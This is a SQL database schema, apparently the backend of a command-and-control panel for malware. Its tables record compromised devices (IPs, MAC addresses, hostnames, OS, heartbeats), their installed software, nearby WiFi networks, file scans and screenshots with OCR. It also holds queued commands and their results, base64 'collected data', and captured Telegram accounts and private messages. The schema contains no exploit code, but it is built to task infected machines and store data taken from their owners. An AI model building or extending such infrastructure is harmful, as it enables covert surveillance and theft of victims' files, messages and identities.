
-- C2 Device
create table if not exists c2_device
(
    id           bigint auto_increment primary key,
    uuid         varchar(64)                        null comment 'Unique Device ID',
    internalIp   varchar(64)                        null comment 'Internal IP',
    externalIp   varchar(64)                        null comment 'External IP',
    macAddress   varchar(64)                        null comment 'MAC Address',
    hostName     varchar(128)                       null comment 'Hostname',
    os           varchar(128)                       null comment 'OS Info',
    lastSeen     datetime                           null comment 'Last Seen',
    heartbeatInterval int default 60000             comment 'Heartbeat Interval',
    createTime   datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
    updateTime   datetime     default CURRENT_TIMESTAMP not null comment 'Update Time',
    isDelete     tinyint      default 0             not null comment 'Is Deleted',
    index idx_uuid (uuid)
);

-- C2 Software List
create table if not exists c2_software
(
    id           bigint auto_increment primary key,
    deviceId     bigint                             not null comment 'Device ID',
    name         varchar(256)                       not null comment 'Software Name',
    version      varchar(64)                        null comment 'Version',
    installDate  varchar(64)                        null comment 'Install Date',
    createTime   datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
    isDelete     tinyint      default 0             not null comment 'Is Deleted',
    index idx_deviceId (deviceId)
);

-- C2 WiFi Data
create table if not exists c2_wifi
(
    id           bigint auto_increment primary key,
    deviceId     bigint                             not null comment 'Device ID',
    ssid         varchar(128)                       not null comment 'SSID',
    bssid        varchar(64)                        null comment 'BSSID (MAC)',
    signalStrength varchar(32)                      null comment 'Signal Strength',
    createTime   datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
    isDelete     tinyint      default 0             not null comment 'Is Deleted',
    index idx_deviceId (deviceId)
);

-- C2 File Scan Results
create table if not exists c2_file_scan
(
    id           bigint auto_increment primary key,
    deviceId     bigint                             not null comment 'Device ID',
    filePath     text                               not null comment 'File Path',
    fileName     varchar(256)                       not null comment 'File Name',
    fileSize     bigint                             not null comment 'File Size',
    md5          varchar(32)                        null comment 'MD5 Hash',
    isRecent     tinyint      default 0             not null comment 'Is Recently Modified',
    lastModified datetime                           null comment 'Last Modified',
    createTime   datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
    isDelete     tinyint      default 0             not null comment 'Is Deleted',
    index idx_deviceId (deviceId)
);

-- C2 Tasks Table
create table if not exists c2_task
(
    id           bigint auto_increment comment 'id' primary key,
    taskId       varchar(64)                        not null comment 'Task ID',
    deviceId     bigint                             null comment 'Target Device ID (null for broadcast)',
    command      varchar(256)                       not null comment 'Command',
    params       text                               null comment 'Parameters',
    status       varchar(32) default 'pending'      not null comment 'Status',
    result       longtext                           null comment 'Result',
    createTime   datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
    updateTime   datetime     default CURRENT_TIMESTAMP not null on update CURRENT_TIMESTAMP comment 'Update Time',
    isDelete     tinyint      default 0                 not null comment 'Is Deleted',
    index idx_taskId (taskId),
    index idx_deviceId (deviceId)
) comment 'C2 Tasks' collate = utf8mb4_unicode_ci;

-- Collected Data Table
create table if not exists collected_data
(
    id           bigint auto_increment comment 'id' primary key,
    dataId       varchar(64)                        not null comment 'Data ID',
    dataType     varchar(32)                        not null comment 'Data Type',
    content      longtext                           null comment 'Content (Base64 or Text)',
    createTime   datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
    isDelete     tinyint      default 0                 not null comment 'Is Deleted'
) comment 'Collected Data' collate = utf8mb4_unicode_ci;

-- TG Account Table
create table if not exists tg_account
(
    id           bigint auto_increment comment 'id' primary key,
    tgId         varchar(64)                        null comment 'Telegram ID',
    username     varchar(128)                       null comment 'Username',
    phone        varchar(32)                        null comment 'Phone',
    firstName    varchar(128)                       null comment 'First Name',
    lastName     varchar(128)                       null comment 'Last Name',
    isBot        tinyint      default 0             comment 'Is Bot',
    systemInfo   text                               null comment 'System Info',
    createTime   datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
    updateTime   datetime     default CURRENT_TIMESTAMP not null on update CURRENT_TIMESTAMP comment 'Update Time',
    isDelete     tinyint      default 0             not null comment 'Is Deleted'
) comment 'TG Accounts' collate = utf8mb4_unicode_ci;

-- TG Message Table
create table if not exists tg_message
(
    id           bigint auto_increment comment 'id' primary key,
    accountId    bigint                             not null comment 'Account ID',
    msgId        bigint                             null comment 'Message ID',
    chatId       varchar(64)                        null comment 'Chat ID',
    senderId     varchar(64)                        null comment 'Sender ID',
    content      text                               null comment 'Content',
    msgType      varchar(32)                        null comment 'Message Type',
    mediaPath    varchar(256)                       null comment 'Media Path',
    msgDate      datetime                           null comment 'Message Date',
    createTime   datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
    isDelete     tinyint      default 0             not null comment 'Is Deleted'
) comment 'TG Messages' collate = utf8mb4_unicode_ci;

-- C2 Screenshot Table
create table if not exists c2_screenshot
(
    id           bigint auto_increment primary key,
    device_uuid  varchar(64)                        not null comment 'Device UUID',
    task_id      varchar(64)                        null comment 'Task ID',
    url          varchar(512)                       null comment 'URL',
    ocr_result   text                               null comment 'OCR Result',
    create_time  datetime     default CURRENT_TIMESTAMP not null comment 'Create Time',
    is_delete    tinyint      default 0             not null comment 'Is Deleted',
    index idx_device_uuid (device_uuid)
) comment 'C2 Screenshots' collate = utf8mb4_unicode_ci;

-- User Table (t_user)
create table if not exists t_user
(
    id           bigint auto_increment comment 'id' primary key,
    userAccount  varchar(256)                           not null comment '账号',
    userPassword varchar(512)                           not null comment '密码',
    userName     varchar(256)                           null comment '用户昵称',
    userAvatar   varchar(1024)                          null comment '用户头像',
    userProfile  varchar(512)                           null comment '用户简介',
    userRole     varchar(256) default 'user'            not null comment '用户角色：user/admin',
    createTime   datetime     default CURRENT_TIMESTAMP not null comment '创建时间',
    updateTime   datetime     default CURRENT_TIMESTAMP not null on update CURRENT_TIMESTAMP comment '更新时间',
    isDelete     tinyint      default 0                 not null comment '是否删除'
) comment '用户' collate = utf8mb4_unicode_ci;
